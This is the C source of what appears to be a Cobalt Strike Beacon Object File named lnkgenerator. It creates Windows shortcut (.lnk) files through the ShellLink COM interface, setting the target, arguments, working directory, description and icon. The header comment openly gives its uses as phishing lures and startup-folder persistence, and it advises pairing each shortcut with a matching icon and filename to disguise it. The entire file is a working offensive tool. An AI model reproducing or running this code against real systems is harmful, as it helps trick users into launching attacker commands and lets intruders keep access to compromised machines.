/*
 * lnkgenerator <lnk path> <target> [arguments] [working dir] [description]
 *
 * Create a Windows shortcut (.lnk) with the ShellLink COM object.  Useful
 * for phishing lures and startup-folder persistence; combine with a
 * matching icon and filename.  The target and arguments are stored as-is,
 * so quote paths with spaces yourself.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID GUID_ShellLink =
    { 0x00021401, 0x0000, 0x0000,
      { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const GUID GUID_IShellLinkA =
    { 0x000214ee, 0x0000, 0x0000,
      { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
static const GUID GUID_IPersistFile =
    { 0x0000010b, 0x0000, 0x0000,
      { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };

void go(char *args, int alen)
{
    datap parser;
    char *path = "", *target = "", *cargs = "", *workdir = "", *desc = "";
    char bufs[5][1024];
    int i, len;
    wchar_t wpath[1024];
    HRESULT hr;
    int initialized = 0;
    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;

    for (i = 0; i < 5; i++) bufs[i][0] = 0;
    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        for (i = 0; i < 5; i++) {
            char *s = BeaconDataExtract(&parser, &len);
            if (s) bof_strncpy(bufs[i], s, sizeof(bufs[i]));
        }
        path = bufs[0]; target = bufs[1]; cargs = bufs[2];
        workdir = bufs[3]; desc = bufs[4];
    }

    if (!path[0] || !target[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: lnkgenerator <lnk path> <target> [arguments] [working dir] [description]\n");
        return;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr)) initialized = 1;

    hr = OLE32$CoCreateInstance(&GUID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                                &GUID_IShellLinkA, (void **)&sl);
    if (FAILED(hr) || !sl) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance(ShellLink) failed: 0x%08lx\n",
                     (unsigned long)hr);
        goto done;
    }

    sl->lpVtbl->SetPath(sl, target);
    if (cargs[0])   sl->lpVtbl->SetArguments(sl, cargs);
    if (workdir[0]) sl->lpVtbl->SetWorkingDirectory(sl, workdir);
    if (desc[0])    sl->lpVtbl->SetDescription(sl, desc);
    sl->lpVtbl->SetIconLocation(sl, target, 0);

    hr = sl->lpVtbl->QueryInterface(sl, &GUID_IPersistFile, (void **)&pf);
    if (FAILED(hr) || !pf) {
        BeaconPrintf(CALLBACK_ERROR, "QueryInterface(IPersistFile) failed: 0x%08lx\n",
                     (unsigned long)hr);
        goto done;
    }

    bof_a2w(path, wpath, 1024);
    hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Created shortcut: %s\n", path);
        BeaconPrintf(CALLBACK_OUTPUT, "  target : %s %s\n", target, cargs);
        if (workdir[0])
            BeaconPrintf(CALLBACK_OUTPUT, "  workdir: %s\n", workdir);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "IPersistFile::Save failed: 0x%08lx\n",
                     (unsigned long)hr);
    }

done:
    if (pf) pf->lpVtbl->Release(pf);
    if (sl) sl->lpVtbl->Release(sl);
    if (initialized) OLE32$CoUninitialize();
}
